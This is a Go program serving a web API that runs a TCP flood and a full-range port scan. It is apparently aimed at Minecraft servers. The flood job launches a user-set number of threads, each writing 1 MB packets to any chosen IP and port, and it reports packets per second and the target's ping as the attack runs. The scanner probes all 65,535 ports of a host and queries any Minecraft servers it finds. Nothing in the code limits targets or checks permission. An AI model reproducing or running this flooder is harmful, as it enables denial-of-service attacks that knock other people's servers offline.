package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var totalPackets uint64

// cpuTimes tracks idle and total CPU times for computing usage.
type cpuTimes struct {
	idle  uint64
	total uint64
}

func readCPU() (cpuTimes, error) {
	f, err := os.Open("/proc/stat")
	if err != nil {
		return cpuTimes{}, err
	}
	defer f.Close()

	var cpu string
	var user, nice, system, idle, iowait, irq, softirq, steal uint64
	_, err = fmt.Fscanf(f, "%s %d %d %d %d %d %d %d %d", &cpu, &user, &nice, &system, &idle, &iowait, &irq, &softirq, &steal)
	if err != nil {
		return cpuTimes{}, err
	}
	total := user + nice + system + idle + iowait + irq + softirq + steal
	return cpuTimes{idle: idle, total: total}, nil
}

func calcCPU(prev, curr cpuTimes) float64 {
	idleDiff := float64(curr.idle - prev.idle)
	totalDiff := float64(curr.total - prev.total)
	if totalDiff <= 0 {
		return 0
	}
	return (1.0 - idleDiff/totalDiff) * 100
}

func getSystemRAMUsageMB() uint64 {
	f, err := os.Open("/proc/meminfo")
	if err != nil {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return m.Alloc / 1024 / 1024
	}
	defer f.Close()

	var memTotal, memAvailable uint64
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "MemTotal:") {
			fmt.Sscanf(line, "MemTotal: %d kB", &memTotal)
		} else if strings.HasPrefix(line, "MemAvailable:") {
			fmt.Sscanf(line, "MemAvailable: %d kB", &memAvailable)
		}
		if memTotal > 0 && memAvailable > 0 {
			break
		}
	}

	if memTotal == 0 {
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return m.Alloc / 1024 / 1024
	}

	usedKB := memTotal - memAvailable
	return usedKB / 1024
}

func measureTCPPing(serverIP string, serverPort int, timeout time.Duration) int64 {
	if serverIP == "" || serverPort <= 0 {
		return -1
	}
	addr := fmt.Sprintf("%s:%d", serverIP, serverPort)
	start := time.Now()
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return -1
	}
	conn.Close()
	return time.Since(start).Milliseconds()
}

// Stats describes the latest runtime statistics shared with the UI.
type Stats struct {
	Elapsed          float64 `json:"elapsed"`
	CPU              float64 `json:"cpu"`
	RAMMB            uint64  `json:"ramMB"`
	TotalPackets     uint64  `json:"totalPackets"`
	PacketsPerSecond float64 `json:"packetsPerSecond"`
	Ping             string  `json:"ping"`
	Status           string  `json:"status"`
}

// ScanProgress tracks Minecraft scanning results.
type ScanProgress struct {
	Host    string            `json:"host"`
	Scanned uint64            `json:"scanned"`
	Total   int               `json:"total"`
	Found   []MinecraftServer `json:"found"`
}

// RunContext tracks the lifetime of a task.
type RunContext struct {
	stop chan struct{}
	once sync.Once
}

// AppState keeps the current server state for AJAX polling.
type AppState struct {
	mu        sync.Mutex
	running   bool
	mode      string
	startTime time.Time
	stats     Stats
	scan      ScanProgress
	ctx       *RunContext
	lastError string
}

func (a *AppState) startRun(mode string) bool {
	a.mu.Lock()
	defer a.mu.Unlock()
	if a.running {
		return false
	}
	a.running = true
	a.mode = mode
	a.lastError = ""
	a.startTime = time.Now()
	a.ctx = &RunContext{stop: make(chan struct{})}
	atomic.StoreUint64(&totalPackets, 0)
	a.stats = Stats{Status: "Running"}
	return true
}

func (a *AppState) stopRun(status string) {
	a.mu.Lock()
	ctx := a.ctx
	if ctx != nil {
		ctx.once.Do(func() { close(ctx.stop) })
	}
	a.stats.Status = status
	a.mu.Unlock()
}

func (a *AppState) finishRun(status string) {
	a.mu.Lock()
	a.running = false
	a.stats.Status = status
	a.ctx = nil
	a.mu.Unlock()
}

func (a *AppState) updateStats(update Stats) {
	a.mu.Lock()
	if !a.running {
		a.mu.Unlock()
		return
	}
	a.stats = update
	a.mu.Unlock()
}

func (a *AppState) updateScan(found []MinecraftServer, scanned uint64, total int, host string) {
	a.mu.Lock()
	a.scan.Found = append([]MinecraftServer(nil), found...)
	a.scan.Scanned = scanned
	a.scan.Total = total
	a.scan.Host = host
	a.mu.Unlock()
}

func (a *AppState) statusResponse() map[string]any {
	a.mu.Lock()
	defer a.mu.Unlock()
	return map[string]any{
		"running": a.running,
		"mode":    a.mode,
		"stats":   a.stats,
		"scan":    a.scan,
		"error":   a.lastError,
	}
}

func startMonitorWeb(app *AppState, ctx *RunContext, startTime time.Time, serverIP string, serverPort int, enablePing bool) {
	prevCPU, err := readCPU()
	if err != nil {
		prevCPU = cpuTimes{}
	}

	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	lastPackets := atomic.LoadUint64(&totalPackets)
	lastTime := time.Now()

	for {
		select {
		case <-ctx.stop:
			return
		case <-ticker.C:
			currCPU, err := readCPU()
			cpuUsage := 0.0
			if err == nil && prevCPU.total != 0 {
				cpuUsage = calcCPU(prevCPU, currCPU)
				prevCPU = currCPU
			}

			ramMB := getSystemRAMUsageMB()
			now := time.Now()
			total := atomic.LoadUint64(&totalPackets)
			dt := now.Sub(lastTime).Seconds()
			pps := 0.0
			if dt > 0 {
				pps = float64(total-lastPackets) / dt
			}
			lastPackets = total
			lastTime = now

			elapsed := now.Sub(startTime).Seconds()
			pingStr := "--"
			if enablePing {
				ping := measureTCPPing(serverIP, serverPort, time.Second)
				if ping >= 0 {
					pingStr = fmt.Sprintf("%dms", ping)
				}
			}

			app.updateStats(Stats{
				Elapsed:          elapsed,
				CPU:              cpuUsage,
				RAMMB:            ramMB,
				TotalPackets:     total,
				PacketsPerSecond: pps,
				Ping:             pingStr,
				Status:           "Running",
			})
		}
	}
}

func sendPacket(serverIP string, serverPort int, packet []byte, packetCount int, packetTimeout time.Duration, useDeadline bool, deadline time.Time, stop <-chan struct{}) {
	addr := fmt.Sprintf("%s:%d", serverIP, serverPort)
	conn, err := net.DialTimeout("tcp", addr, 5*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	for i := 0; i < packetCount; i++ {
		select {
		case <-stop:
			return
		default:
		}

		if useDeadline && time.Now().After(deadline) {
			return
		}

		if _, err := conn.Write(packet); err != nil {
			return
		}

		atomic.AddUint64(&totalPackets, 1)

		if packetTimeout > 0 {
			select {
			case <-stop:
				return
			case <-time.After(packetTimeout):
			}
		}
	}
}

// Minecraft types and helpers.
type PlayersInfo struct {
	Max    int `json:"max"`
	Online int `json:"online"`
}

type StatusResponse struct {
	Version struct {
		Name     string `json:"name"`
		Protocol int    `json:"protocol"`
	} `json:"version"`
	Players     PlayersInfo `json:"players"`
	Description any         `json:"description"`
}

type MinecraftServer struct {
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Online   int    `json:"online"`
	Max      int    `json:"max"`
	Version  string `json:"version"`
	Protocol int    `json:"protocol"`
	MOTD     string `json:"motd"`
	PingMS   int64  `json:"pingMS"`
}

func writeVarInt(w io.Writer, v int) {
	for {
		b := byte(v & 0x7F)
		v >>= 7
		if v != 0 {
			b |= 0x80
		}
		w.Write([]byte{b})
		if v == 0 {
			break
		}
	}
}

func readVarInt(r io.Reader) (int, error) {
	var v, shift int
	for i := 0; i < 5; i++ {
		b := make([]byte, 1)
		if _, err := r.Read(b); err != nil {
			return 0, err
		}
		val := int(b[0] & 0x7F)
		v |= val << shift
		shift += 7
		if b[0]&0x80 == 0 {
			return v, nil
		}
	}
	return 0, fmt.Errorf("VarInt too big")
}

func writeMCString(w io.Writer, s string) {
	writeVarInt(w, len(s))
	w.Write([]byte(s))
}

type bytesBuffer struct{ buf []byte }

func (b *bytesBuffer) Write(p []byte) (int, error) {
	b.buf = append(b.buf, p...)
	return len(p), nil
}

func queryServer(host string, port int) (*MinecraftServer, error) {
	start := time.Now()
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := net.DialTimeout("tcp", addr, 4*time.Second)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	hs := make([]byte, 0, 100)
	buf := &bytesBuffer{buf: hs}
	writeVarInt(buf, 0)
	writeVarInt(buf, 758)
	writeMCString(buf, host)
	buf.Write([]byte{byte(port >> 8), byte(port & 0xFF)})
	writeVarInt(buf, 1)

	writeVarInt(conn, len(buf.buf))
	conn.Write(buf.buf)

	writeVarInt(conn, 1)
	writeVarInt(conn, 0)

	conn.SetReadDeadline(time.Now().Add(4 * time.Second))
	_, _ = readVarInt(conn)
	if pktID, _ := readVarInt(conn); pktID != 0 {
		return nil, fmt.Errorf("not status packet")
	}

	jsonLen, _ := readVarInt(conn)
	jsonData := make([]byte, jsonLen)
	if _, err := io.ReadFull(conn, jsonData); err != nil {
		return nil, err
	}

	var status StatusResponse
	if err := json.Unmarshal(jsonData, &status); err != nil {
		return nil, err
	}

	ping := time.Since(start).Milliseconds()
	motd := fmt.Sprintf("%v", status.Description)
	if s, ok := status.Description.(string); ok {
		motd = s
	}
	motd = strings.ReplaceAll(strings.ReplaceAll(motd, "\n", " | "), "§", "&")

	return &MinecraftServer{
		Host:     host,
		Port:     port,
		Online:   status.Players.Online,
		Max:      status.Players.Max,
		Version:  status.Version.Name,
		Protocol: status.Version.Protocol,
		MOTD:     motd,
		PingMS:   ping,
	}, nil
}

func scanPort(host string, port int, scanned *uint64, found *[]MinecraftServer, mu *sync.Mutex, stop <-chan struct{}) {
	select {
	case <-stop:
		return
	default:
	}

	atomic.AddUint64(scanned, 1)
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", host, port), 3*time.Second)
	if err != nil {
		return
	}
	conn.Close()

	if server, err := queryServer(host, port); err == nil {
		mu.Lock()
		*found = append(*found, *server)
		mu.Unlock()
	}
}

func runTCPFlood(app *AppState, req floodRequest) {
	if !app.startRun("tcp-flood") {
		app.mu.Lock()
		app.lastError = "Another job is already running"
		app.mu.Unlock()
		return
	}

	ctx := app.ctx
	start := time.Now()
	packet := make([]byte, 1024*1024)
	useDeadline := req.DurationSeconds > 0
	deadline := start.Add(time.Duration(req.DurationSeconds) * time.Second)
	packetTimeout := time.Duration(req.PacketTimeoutMs) * time.Millisecond

	go startMonitorWeb(app, ctx, start, req.IP, req.Port, true)

	var wg sync.WaitGroup
	for i := 0; i < req.ThreadCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sendPacket(req.IP, req.Port, packet, req.PacketCountPerThread, packetTimeout, useDeadline, deadline, ctx.stop)
		}()
	}

	wg.Wait()
	ctx.once.Do(func() { close(ctx.stop) })

	elapsed := time.Since(start).Seconds()
	total := atomic.LoadUint64(&totalPackets)
	finalStats := Stats{
		Elapsed:          elapsed,
		TotalPackets:     total,
		PacketsPerSecond: 0,
		Status:           "Completed",
	}
	if elapsed > 0 {
		finalStats.PacketsPerSecond = float64(total) / elapsed
	}
	finalStats.RAMMB = getSystemRAMUsageMB()
	finalStats.Ping = "--"
	finalStats.CPU = app.stats.CPU
	app.updateStats(finalStats)

	app.finishRun("Completed")
}

func runScan(app *AppState, host string) {
	if !app.startRun("scan") {
		app.mu.Lock()
		app.lastError = "Another job is already running"
		app.mu.Unlock()
		return
	}
	ctx := app.ctx
	const totalPorts = 65535
	var scanned uint64
	found := make([]MinecraftServer, 0)
	var mu sync.Mutex

	start := time.Now()
	go startMonitorWeb(app, ctx, start, host, 25565, false)

	workerLimit := 512
	sem := make(chan struct{}, workerLimit)
	var wg sync.WaitGroup
	for port := 1; port <= totalPorts; port++ {
		select {
		case <-ctx.stop:
			break
		default:
		}

		sem <- struct{}{}
		wg.Add(1)
		go func(p int) {
			defer wg.Done()
			scanPort(host, p, &scanned, &found, &mu, ctx.stop)
			<-sem
			app.updateScan(found, scanned, totalPorts, host)
		}(port)
	}

	wg.Wait()
	ctx.once.Do(func() { close(ctx.stop) })

	sort.Slice(found, func(i, j int) bool { return found[i].Online > found[j].Online })
	app.updateScan(found, scanned, totalPorts, host)
	app.finishRun("Completed")
}

// HTTP handlers and requests.
type floodRequest struct {
	IP                   string `json:"ip"`
	Port                 int    `json:"port"`
	PacketCountPerThread int    `json:"packetCountPerThread"`
	ThreadCount          int    `json:"threadCount"`
	PacketTimeoutMs      int    `json:"packetTimeoutMs"`
	DurationSeconds      int    `json:"durationSeconds"`
}

func handleStartFlood(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var req floodRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			http.Error(w, "invalid request", http.StatusBadRequest)
			return
		}

		if req.IP == "" || req.Port <= 0 || req.Port > 65535 || req.PacketCountPerThread <= 0 || req.ThreadCount <= 0 {
			http.Error(w, "missing or invalid fields", http.StatusBadRequest)
			return
		}

		go runTCPFlood(app, req)
		w.WriteHeader(http.StatusAccepted)
	}
}

func handleStartScan(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		var body struct {
			Host string `json:"host"`
		}
		if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
			http.Error(w, "invalid request", http.StatusBadRequest)
			return
		}
		if strings.TrimSpace(body.Host) == "" {
			http.Error(w, "host is required", http.StatusBadRequest)
			return
		}

		go runScan(app, strings.TrimSpace(body.Host))
		w.WriteHeader(http.StatusAccepted)
	}
}

func handleStop(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		app.stopRun("Stopped")
		w.WriteHeader(http.StatusOK)
	}
}

func handleStatus(app *AppState) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		resp := app.statusResponse()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(resp)
	}
}

func main() {
	app := &AppState{}

	fs := http.FileServer(http.Dir("public"))
	http.Handle("/", fs)
	http.Handle("/api/start-flood", handleStartFlood(app))
	http.Handle("/api/start-scan", handleStartScan(app))
	http.Handle("/api/stop", handleStop(app))
	http.Handle("/api/status", handleStatus(app))

	log.Println("Web server running on http://localhost:8080")
	if err := http.ListenAndServe(":8080", nil); err != nil {
		log.Fatalf("server error: %v", err)
	}
}
